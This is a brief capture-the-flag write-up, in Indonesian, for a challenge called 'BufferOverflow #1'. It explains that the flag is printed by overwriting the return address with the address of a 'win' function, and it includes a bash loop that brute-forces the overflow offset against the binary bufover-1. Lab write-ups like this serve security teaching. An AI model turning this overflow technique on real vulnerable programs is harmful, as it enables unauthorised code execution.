# BufferOverflow #1

<img src="bufo1.png"><br>
hanya dengan menoverwrite alamat fungsi win untuk mencetak flag<br>
<img src="bufo1a.png"><br>




<br>


```
for i in {1..50}; do echo $i; python -c "print 'A'*$i + '\xb2\x91\x04\x08'"| ./bufover-1 ;done
```

<br>


